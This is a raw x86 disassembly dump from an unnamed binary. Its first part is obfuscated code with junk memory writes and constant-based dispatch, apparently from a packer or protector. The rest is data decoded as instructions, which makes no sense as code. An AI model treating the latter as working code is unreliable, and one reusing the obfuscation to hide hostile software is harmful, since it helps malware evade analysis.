  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     ah,BYTE PTR [eax+ebx*4-0xc]
  417974:	pop    ds
  417975:	test   BYTE PTR [eax-0x63178486],bh
  41797b:	jnp    0x4179f8
  41797d:	rol    DWORD PTR [ecx+edi*4-0x35],0xa
  417982:	push   esi
  417983:	fistp  QWORD PTR ds:0xb2e0c7eb
  417989:	stos   DWORD PTR es:[edi],eax
  41798a:	test   BYTE PTR [ebp+0x140ea137],dl
  417990:	retf   0xf409
  417993:	stos   BYTE PTR es:[edi],al
  417994:	mov    al,ds:0xc4061819
  417999:	dec    edi
  41799a:	nop
  41799b:	imul   edx,DWORD PTR [ecx-0x2e],0xfffffff9
  41799f:	inc    edi
  4179a0:	imul   edi,DWORD PTR [edx+0x1],0x70
  4179a4:	int3   
  4179a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179a6:	push   es
  4179a7:	or     bl,cl
  4179a9:	push   edi
  4179aa:	std    
  4179ab:	adc    ah,BYTE PTR [ecx+edx*4+0x76fccb6e]
  4179b2:	or     eax,0x4a751b48
  4179b7:	jge    0x417a34
  4179b9:	push   edi
  4179ba:	push   cs
  4179bb:	xor    dh,dl
  4179bd:	pop    edx
  4179be:	nop
  4179bf:	mov    ds:0xca3d3d4e,eax
  4179c4:	sbb    bl,BYTE PTR [esi+0x47]
  4179c7:	and    eax,0xf5b42dc1
  4179cc:	sbb    ax,0xaca5
  4179d0:	rol    bl,1
  4179d2:	popa   
  4179d3:	and    DWORD PTR [esi-0x78b35637],eax
  4179d9:	push   0x2f
  4179db:	popf   
  4179dc:	ret    
  4179dd:	sbb    eax,0xcd07571c
  4179e2:	ja     0x4179b8
  4179e4:	ret    
  4179e5:	mov    ds:0x8955eb97,al
  4179ea:	xlat   BYTE PTR ds:[ebx]
  4179eb:	add    al,0x9f
  4179ed:	popf   
  4179ee:	fwait
  4179ef:	test   ecx,eax
  4179f1:	xor    ah,BYTE PTR [eax]
  4179f3:	and    DWORD PTR [ecx],0xfaaa4b6e
  4179f9:	out    0xc7,eax
  4179fb:	out    dx,eax
  4179fc:	xchg   esi,eax
  4179fd:	cwde   
  4179fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ff:	jmp    0x4c1a:0x4708843
  417a06:	pop    es
  417a07:	pop    edi
  417a08:	out    dx,eax
  417a09:	xor    eax,0xfdc49cc8
  417a0e:	into   
  417a0f:	jg     0x41799d
  417a11:	je     0x417a3a
  417a13:	ret    0x119c
  417a16:	mov    bh,0x14
  417a18:	sub    BYTE PTR [edi+esi*2-0x34983a60],0xa3
  417a20:	mov    ebx,0x92ee28a0
  417a25:	cmp    bl,BYTE PTR [edx+0x76]
  417a28:	mov    esi,0xeccf7dd0
  417a2d:	mov    ecx,0xc58a0f34
  417a32:	in     eax,dx
  417a33:	mov    dl,0x81
  417a35:	test   eax,0x8e7d90a9
  417a3a:	sbb    DWORD PTR [edi-0x60],0x9
  417a3e:	xor    DWORD PTR [ebx],0x1e
  417a41:	jecxz  0x4179ef
  417a43:	lods   eax,DWORD PTR ds:[esi]
  417a44:	shr    DWORD PTR es:[esi+edx*4-0x6d],cl
  417a49:	adc    edx,DWORD PTR [ebp-0xd99f5b4]
  417a4f:	test   eax,0xfc71ad1d
  417a54:	iret   
  417a55:	jbe    0x417a1c
  417a57:	sub    BYTE PTR [esi],ah
  417a59:	test   edi,ebx
  417a5b:	pushf  
  417a5c:	xchg   ecx,eax
  417a5d:	mov    al,bh
  417a5f:	sbb    esi,DWORD PTR [esi-0x4a09341e]
  417a65:	loopne 0x417a99
  417a67:	xor    eax,0x951a9514
  417a6c:	fadd   st,st(1)
  417a6e:	or     BYTE PTR [esi+0x2995f75c],ch
  417a74:	sbb    ebx,DWORD PTR [ecx]
  417a76:	xchg   esi,eax
  417a77:	add    bl,BYTE PTR [esp-0x2e]
  417a7b:	sbb    DWORD PTR [esi],edi
  417a7d:	test   al,0x98
  417a7f:	aaa    
  417a80:	js     0x417a56
  417a82:	adc    cl,ah
  417a84:	in     eax,dx
  417a85:	fcmove st,st(2)
  417a87:	sahf   
  417a88:	jb     0x417a34
  417a8a:	sti    
  417a8b:	inc    eax
  417a8c:	and    DWORD PTR [ecx+edi*4-0x782a4bb6],0x7e214f8a
  417a97:	xchg   edx,eax
  417a98:	icebp  
  417a99:	mov    ebp,0x8d78f434
  417a9e:	je     0x417a3f
  417aa0:	cmp    bl,bh
  417aa2:	imul   eax,DWORD PTR [edx],0x630fe1b8
  417aa8:	bound  edx,QWORD PTR [edi]
  417aaa:	push   esp
  417aab:	stc    
  417aac:	in     al,dx
  417aad:	push   0xffffff87
  417aaf:	mov    ecx,0x926dce9e
  417ab4:	not    DWORD PTR [ebp-0x7a]
  417ab7:	mov    DWORD PTR [ebx+0x4a],eax
  417aba:	xchg   ebp,eax
  417abb:	adc    DWORD PTR [ebx+eax*4-0x6e154a4e],ebp
  417ac2:	test   DWORD PTR [esi+0x500abac],edx
  417ac8:	loop   0x417a6d
  417aca:	call   0xd14e:0xda33fcf0
  417ad1:	and    DWORD PTR [ebx],ebp
  417ad3:	loopne 0x417ab0
  417ad5:	(bad)  
  417ad6:	cmp    cl,bh
  417ad8:	mov    al,0xbf
  417ada:	push   esi
  417adb:	fdivp  st(7),st
  417add:	mov    ds:0xf8ab7203,eax
  417ae2:	add    edx,DWORD PTR ss:[edx-0x6fb07e78]
  417ae9:	outs   dx,BYTE PTR ds:[esi]
  417aea:	add    ebp,ebx
  417aec:	test   ebp,edx
  417aee:	mov    ds,WORD PTR [edi-0x57]
  417af1:	inc    esp
  417af2:	mov    BYTE PTR [edx+ecx*4+0x298a67b2],bl
  417af9:	dec    esp
  417afa:	addr16 mov dl,0x46
  417afd:	pop    ss
  417afe:	aam    0x68
  417b00:	cmp    BYTE PTR [ecx-0x5b],0x4c
  417b04:	out    dx,al
  417b05:	scas   al,BYTE PTR es:[edi]
  417b06:	push   esi
  417b07:	jp     0x417af6
  417b09:	lds    edx,FWORD PTR [ebx]
  417b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b0c:	nop
  417b0d:	test   BYTE PTR [ebp+eax*4+0xf],dl
  417b11:	sbb    cl,dl
  417b13:	fsincos 
  417b15:	scas   eax,DWORD PTR es:[edi]
  417b16:	test   dh,cl
  417b18:	sbb    BYTE PTR [ecx+0x496cdeea],dh
  417b1e:	xor    edx,DWORD PTR [ecx-0x3e5f126]
  417b24:	pop    es
  417b25:	mov    cl,0xc8
  417b27:	arpl   bp,sp
  417b29:	cmp    al,0xa6
  417b2b:	dec    edi
  417b2c:	jb     0x417b24
  417b2e:	xor    dh,BYTE PTR [ecx+0x3372c358]
  417b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b35:	sbb    edx,edi
  417b37:	push   ecx
  417b38:	jb     0x417b3d
  417b3a:	xor    DWORD PTR [ecx+ecx*1],ebx
  417b3d:	iret   
  417b3e:	mov    ecx,0x9081e2d
  417b43:	enter  0xd651,0x28
  417b47:	loope  0x417b74
  417b49:	jecxz  0x417b24
  417b4b:	ins    DWORD PTR es:[edi],dx
  417b4c:	ficomp WORD PTR ds:0x46a2f092
  417b52:	sbb    BYTE PTR [edi],bh
  417b54:	(bad)  
  417b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b56:	sbb    DWORD PTR [ebx+0x21e6f44b],edi
  417b5c:	sub    ch,bl
  417b5e:	ror    DWORD PTR [ebx+0x22ace3e2],0x58
  417b65:	mov    WORD PTR [edi-0x3b],cs
  417b68:	sub    eax,0x83f6dd70
  417b6d:	aam    0xb1
  417b6f:	xchg   esi,eax
  417b70:	je     0x417ba8
  417b72:	pop    ecx
  417b73:	stc    
  417b74:	jmp    0x74a:0xa9872c9e
  417b7b:	xchg   esp,eax
  417b7c:	sub    DWORD PTR [esi+0xe],esi
  417b7f:	sbb    edi,DWORD PTR es:[edi]
  417b82:	xchg   esp,eax
  417b83:	cmp    cl,BYTE PTR ds:0xd6ae8e97
  417b89:	(bad)  
  417b8a:	mov    ch,0x69
  417b8c:	sbb    ebp,DWORD PTR [ebx+0x5dfa752c]
  417b92:	xor    bh,bh
  417b94:	dec    esp
  417b95:	xchg   esi,eax
  417b96:	(bad)  [edx-0x7b]
  417b99:	jmp    0x417b57
  417b9b:	jne    0x417b46
  417b9d:	mov    cs,WORD PTR [ebx+0x7e]
  417ba0:	and    al,0x7b
  417ba2:	dec    edx
  417ba3:	mov    cl,0xac
  417ba5:	cmp    BYTE PTR [eax-0x5fb6916c],bh
  417bab:	icebp  
  417bac:	push   0xffffffad
  417bae:	push   ds
  417baf:	dec    eax
  417bb0:	repnz mov ah,0x8a
  417bb3:	ss jmp 0x417b47
  417bb6:	je     0x417bc3
  417bb8:	test   al,0xfe
  417bba:	sub    ecx,edx
  417bbc:	(bad)  
  417bbd:	dec    esi
  417bbe:	xchg   ecx,eax
  417bbf:	fisttp QWORD PTR [ebp+edx*2+0x6e]
  417bc3:	iret   
  417bc4:	lea    esi,[eax+0x390d2ae8]
  417bca:	dec    ecx
  417bcb:	dec    edi
  417bcc:	outs   dx,DWORD PTR ds:[esi]
  417bcd:	xor    esi,ebp
  417bcf:	adc    dl,bh
  417bd1:	sar    DWORD PTR [ebp-0x2a],0x27
  417bd5:	jp     0x417c28
  417bd7:	mov    eax,ds:0xb3b34210
  417bdc:	xchg   ebx,eax
  417bdd:	mov    esi,0x50a5dd7b
  417be2:	push   edx
  417be3:	in     eax,dx
  417be4:	(bad)  
  417be5:	scas   al,BYTE PTR es:[edi]
  417be6:	dec    ebx
  417be7:	xor    esp,esp
  417be9:	cmp    BYTE PTR [eax-0x12],al
  417bec:	sub    al,0x1e
  417bee:	ds mov dl,0x93
  417bf1:	ror    DWORD PTR [edx-0x59d1a67e],1
  417bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bf8:	loop   0x417bb0
  417bfa:	sub    ah,dl
  417bfc:	dec    ebx
  417bfd:	mov    ds:0x53421254,eax
  417c02:	cmp    al,0xfe
  417c04:	adc    BYTE PTR [esi],dh
  417c06:	mov    ebx,0xf4f3b39e
  417c0b:	inc    ebp
  417c0c:	dec    ebx
  417c0d:	xchg   ebp,eax
  417c0e:	idiv   BYTE PTR es:[edi+0x1f]
  417c12:	and    al,0xc4
  417c14:	aam    0xf
  417c16:	jne    0x417c32
  417c18:	int3   
  417c19:	mov    bl,0xc7
  417c1b:	mov    WORD PTR [esi-0x6e5cbc0a],?
  417c21:	inc    ebp
  417c22:	and    bh,dh
  417c24:	repnz dec DWORD PTR [ebp+0x7de16db2]
  417c2b:	and    BYTE PTR [eax],al
  417c2d:	js     0x417bd9
  417c2f:	pop    edi
  417c30:	and    al,BYTE PTR [ebp-0x1a]
  417c33:	test   BYTE PTR [ebx],cl
  417c35:	jecxz  0x417bba
  417c37:	lock mov ah,0xc5
  417c3a:	sub    eax,0x6d7272eb
  417c3f:	aad    0x39
  417c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c42:	enter  0xa513,0x4
  417c46:	mov    edi,edx
  417c48:	jge    0x417c1a
  417c4a:	jne    0x417bd9
  417c4c:	mov    al,ds:0xa6f06c87
  417c51:	leavew 
  417c53:	clc    
  417c54:	push   esi
  417c55:	sub    eax,0xb4a057c6
  417c5a:	jnp    0x417bf3
  417c5c:	in     al,0xfc
  417c5e:	dec    ebp
  417c5f:	aam    0xec
  417c61:	xchg   edx,eax
  417c62:	push   0x7e
  417c64:	sbb    eax,DWORD PTR [esi+0x1f]
  417c67:	or     DWORD PTR [ebp-0x48cbb525],esp
  417c6d:	int3   
  417c6e:	sub    DWORD PTR [edi-0x79e8215a],edx
  417c74:	jl     0x417c3a
  417c76:	pop    ss
  417c77:	push   ebx
  417c78:	cmp    DWORD PTR [ebx],ebx
  417c7a:	aaa    
  417c7b:	iret   
  417c7c:	jbe    0x417c19
  417c7e:	push   ss
  417c7f:	sar    DWORD PTR [edx+edx*2-0x2c5e9228],0x8b
  417c87:	pusha  
  417c88:	enter  0xcdb,0x1a
  417c8c:	xchg   eax,edx
  417c8e:	fcmovne st,st(2)
  417c90:	lods   eax,DWORD PTR ds:[esi]
  417c91:	cmp    DWORD PTR [ebx-0x44],0xbd38e64b
  417c98:	jbe    0x417d17
  417c9a:	jae    0x417cbf
  417c9c:	ror    BYTE PTR [ecx+0x63],cl
  417c9f:	pop    edi
  417ca0:	xor    eax,0x51a78c24
  417ca5:	or     al,0x7f
  417ca7:	clc    
  417ca8:	push   esp
  417ca9:	dec    esi
  417caa:	and    ah,ch
  417cac:	jmp    0xda0a617e
  417cb1:	cmp    BYTE PTR [ecx],bh
  417cb3:	mov    ah,0x32
  417cb5:	(bad)  
  417cb6:	cmp    eax,0xc75626b3
  417cbb:	or     esp,DWORD PTR [eax+0x76]
  417cbe:	mov    al,ds:0xfffec85c
  417cc3:	cmp    al,0xf1
  417cc5:	xor    al,0x33
  417cc7:	call   0x9facc3ae
  417ccc:	mov    ds:0x3b65ccf1,al
  417cd1:	mov    BYTE PTR [ebp+ebp*2+0x1fec6c8f],bl
  417cd8:	loope  0x417c5b
  417cda:	xor    DWORD PTR [ebx],edi
  417cdc:	jmp    0x417ce5
  417cde:	inc    ebx
  417cdf:	(bad)  
  417ce0:	out    dx,eax
  417ce1:	push   ds
  417ce2:	imul   edx,DWORD PTR [ebp-0x463c1c0f],0xffffffd2
  417ce9:	ins    BYTE PTR es:[edi],dx
  417cea:	mov    DWORD PTR [edi+ebx*4],ebx
  417ced:	xchg   ebx,eax
  417cee:	jmp    0xc0e5fe5a
  417cf3:	inc    eax
  417cf4:	sbb    al,0xb8
  417cf6:	cmp    BYTE PTR [esi-0x47],0x6c
  417cfa:	loop   0x417d1a
  417cfc:	sbb    eax,0x90fe8bcc
  417d01:	popa   
  417d02:	enter  0xb527,0x5d
  417d06:	(bad)  
  417d08:	jmp    0xda6d:0x3c05b23c
  417d0f:	sbb    al,0x92
  417d11:	push   ebx
  417d12:	dec    esi
  417d13:	outs   dx,DWORD PTR ds:[esi]
  417d14:	repz cmp dh,BYTE PTR [eax]
  417d17:	cdq    
  417d18:	adc    BYTE PTR [edx],al
  417d1a:	jge    0x417d4b
  417d1c:	push   ds
  417d1d:	jp     0x417cb0
  417d1f:	or     eax,0x9d4aa72d
  417d24:	sub    ecx,DWORD PTR [ecx-0x6c]
  417d27:	lods   al,BYTE PTR ds:[esi]
  417d28:	xor    ch,al
  417d2a:	aas    
  417d2b:	sub    bh,BYTE PTR [esi+0x4050fc00]
  417d31:	inc    ecx
  417d32:	inc    edx
  417d33:	jl     0x417d58
  417d35:	imul   eax,DWORD PTR [ecx-0x6b750144],0x67
  417d3c:	jecxz  0x417d0d
  417d3e:	sbb    bl,BYTE PTR [ecx+0x3c3976f1]
  417d44:	push   esi
  417d45:	in     al,dx
  417d46:	std    
  417d47:	or     eax,0xded9143c
  417d4c:	test   DWORD PTR [ecx],edx
  417d4e:	cmp    ebp,ebp
  417d50:	ror    ecx,cl
  417d52:	lods   al,BYTE PTR ds:[esi]
  417d53:	and    eax,0x4bfe7299
  417d58:	jnp    0x417d9a
  417d5a:	sub    DWORD PTR [ecx],ecx
  417d5c:	inc    esp
  417d5d:	(bad)  
  417d5f:	jbe    0x417d4f
  417d61:	jns    0x417db7
  417d63:	jb     0x417d5a
  417d65:	and    cl,BYTE PTR [edx+0x5a]
  417d68:	addr16 loop 0x417d10
  417d6b:	push   ecx
  417d6c:	repnz mov DWORD PTR [ebx],esp
  417d6f:	sub    BYTE PTR [edi+ebx*2-0x68],bl
  417d73:	(bad)  
  417d74:	and    eax,0x64055af7
  417d79:	aaa    
  417d7a:	leave  
  417d7b:	sub    DWORD PTR [ebx+esi*8-0x737e8d73],edi
  417d82:	xor    bh,bh
  417d84:	mov    al,ah
  417d86:	xchg   BYTE PTR [ebp-0x15692cce],al
  417d8c:	test   DWORD PTR [edi+0x6c9d18bd],0xc1b51c36
  417d96:	mov    ch,0x39
  417d98:	es cdq 
  417d9a:	jo     0x417d3a
  417d9c:	imul   DWORD PTR [esi-0x41b9b6eb]
  417da2:	jns    0x417db0
  417da4:	cs bnd jne 0x417e01
  417da8:	cld    
  417da9:	jl     0x417d92
  417dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dac:	pop    eax
  417dad:	jmp    0x417d39
  417daf:	mov    eax,0x77feff96
  417db4:	retf   0x540b
  417db7:	(bad)  
  417db8:	(bad)  
  417db9:	out    0x8e,eax
  417dbb:	call   0x61787bc9
  417dc0:	inc    ebx
  417dc1:	dec    ecx
  417dc2:	jle    0x417d6e
  417dc4:	adc    eax,0x63f158e2
  417dc9:	or     DWORD PTR ds:0xf67b6c09,ebp
  417dcf:	pop    eax
  417dd0:	test   al,0x3f
  417dd2:	call   0x7c96:0x6e5cf51a
  417dd9:	or     ch,BYTE PTR [esi]
  417ddb:	push   ss
  417ddc:	jecxz  0x417da8
  417dde:	jg     0x417d97
  417de0:	push   edi
  417de1:	and    ecx,0xffffff97
  417de4:	or     DWORD PTR [edi+0x763523d4],ebp
  417dea:	mov    bh,0xf6
  417dec:	cmp    ch,BYTE PTR [eax]
  417dee:	mov    ebp,DWORD PTR [esi]
  417df0:	adc    BYTE PTR [edi+0x199218e6],dl
  417df6:	adc    al,0x6b
  417df8:	rol    ecx,0x5b
  417dfb:	fdivr  QWORD PTR [eax]
  417dfd:	inc    ebx
  417dfe:	adc    BYTE PTR [edi+0x2e],dh
  417e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e02:	cli    
  417e03:	or     bl,BYTE PTR [ecx-0x739e9ed6]
  417e09:	mov    eax,fs:0x3fdd3166
  417e0f:	fdiv   QWORD PTR [esi-0x1d]
  417e12:	mov    DWORD PTR [ecx],eax
  417e14:	add    esp,DWORD PTR [ebp+0xa1bd279]
  417e1a:	mov    ecx,0x64a4dccc
  417e1f:	scas   al,BYTE PTR es:[edi]
  417e20:	sub    DWORD PTR [eax+0x8],edi
  417e23:	gs push ds
  417e25:	retf   
  417e26:	cmp    edi,DWORD PTR [esi+0x2d]
  417e29:	ins    BYTE PTR es:[edi],dx
  417e2a:	in     al,0x0
  417e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e2d:	mov    ch,bh
  417e2f:	add    ah,cl
  417e31:	aas    
  417e32:	out    0x76,al
  417e34:	cmp    BYTE PTR [ecx+0x22],ch
  417e37:	push   esi
  417e38:	inc    edi
  417e39:	dec    esi
  417e3a:	test   ebp,0x7a7c1fe1
  417e40:	xor    BYTE PTR ds:0xc1067de9,ah
  417e46:	adc    al,0xf7
  417e48:	adc    esi,DWORD PTR [ecx+0x37a74cb]
  417e4e:	jne    0x417e61
  417e50:	add    di,bp
  417e53:	or     eax,0xc8f1fba
  417e58:	pop    ecx
  417e59:	das    
  417e5a:	jmp    0x7959:0x514acf92
  417e61:	loope  0x417e25
  417e63:	xor    al,0xe6
  417e65:	mov    ch,0xb8
  417e67:	test   BYTE PTR gs:[esi-0x631ea867],ch
  417e6e:	add    al,0x61
  417e70:	outs   dx,BYTE PTR ds:[esi]
  417e71:	jecxz  0x417eaf
  417e73:	scas   al,BYTE PTR es:[edi]
  417e74:	call   0x1a31:0xfde97cdc
  417e7b:	xchg   edi,eax
  417e7c:	enter  0xe9bd,0x39
  417e80:	jo     0x417e68
  417e82:	xor    edi,DWORD PTR [ecx-0x351f89ca]
  417e88:	jmp    0xfb3db459
  417e8d:	nop
  417e8e:	xor    esp,esp
  417e90:	call   0x2bc3:0xded49d71
  417e97:	shl    cl,0xd5
  417e9a:	arpl   bp,bx
  417e9c:	dec    esi
  417e9d:	ret    0xd659
  417ea0:	cmp    DWORD PTR [eax-0x7d62f514],edi
  417ea6:	adc    dl,ah
  417ea8:	cmp    edx,ebx
  417eaa:	adc    edx,DWORD PTR [edi-0x7e]
  417ead:	jmp    0x417e4c
  417eaf:	xor    DWORD PTR [ecx],0xacf48abe
  417eb5:	xlat   BYTE PTR ds:[ebx]
  417eb6:	xor    bl,BYTE PTR [ecx+0x644e7098]
  417ebc:	jmp    0x3de0e39b
  417ec1:	jp     0x417e74
  417ec3:	dec    ecx
  417ec4:	push   edx
  417ec5:	ret    0x3a23
  417ec8:	jl     0x417ef2
  417eca:	push   cs
  417ecb:	leave  
  417ecc:	jns    0x417f04
  417ece:	clc    
  417ecf:	push   0x12
  417ed1:	inc    ebp
  417ed2:	sub    al,0x8b
  417ed4:	xlat   BYTE PTR ds:[ebx]
  417ed5:	(bad)  
  417ed6:	(bad)  
  417ed8:	xor    eax,0x7a50bc91
  417edd:	lock cmp ebx,ebp
  417ee0:	add    esi,esi
  417ee2:	mov    bh,0xa1
  417ee4:	call   FWORD PTR [ebx+esi*1-0x71]
  417ee8:	call   0x1453:0x707b8acb
  417eef:	push   ss
  417ef0:	inc    eax
  417ef1:	push   edi
  417ef2:	inc    edx
  417ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef4:	add    eax,0x3c014389
  417ef9:	sbb    esi,DWORD PTR [esi]
  417efb:	add    al,0x17
  417efd:	adc    DWORD PTR gs:[esi],0x2d
  417f01:	xor    al,0xa8
  417f03:	shl    DWORD PTR [edi+0x3e],cl
  417f06:	(bad)  
  417f09:	xchg   esp,eax
  417f0a:	cmc    
  417f0b:	add    al,0x58
  417f0d:	mov    esp,0x657a1ce5
  417f12:	add    al,BYTE PTR [ebx]
  417f14:	mov    ds:0x4c1ae7d0,al
  417f19:	sub    eax,0x9fd04afe
  417f1e:	bound  edi,QWORD PTR [ecx]
  417f20:	jae    0x417f01
  417f22:	and    al,0x3f
  417f24:	adc    DWORD PTR [ebp+eiz*8+0x4fcd2f9b],ebx
  417f2b:	mov    ebx,DWORD PTR [esp+ebp*2]
  417f2e:	les    edx,FWORD PTR [ecx]
  417f30:	ret    
  417f31:	in     eax,0xd6
  417f33:	outs   dx,BYTE PTR ds:[esi]
  417f34:	retf   
  417f35:	enter  0x7e98,0xd7
  417f39:	lock jle 0x417ee4
  417f3c:	retf   0xc4c4
  417f3f:	xchg   ebp,eax
  417f40:	mov    ebp,0x2744ca36
  417f45:	pop    ds
  417f46:	scas   eax,DWORD PTR es:[edi]
  417f47:	fwait
  417f48:	(bad)  
  417f49:	dec    ebx
  417f4a:	stc    
  417f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f4d:	mov    ebx,esp
  417f4f:	cmp    BYTE PTR [ebx+esi*2+0x31],bh
  417f53:	ds stos BYTE PTR es:[edi],al
  417f55:	jge    0x417fd0
  417f57:	pop    ebp
  417f58:	(bad)  
  417f5a:	test   BYTE PTR [eax-0xf],cl
  417f5d:	fwait
  417f5e:	mov    bp,0x4dcb
  417f62:	mov    edx,0xabb00d0e
  417f67:	jmp    0x417f7d
  417f69:	retf   
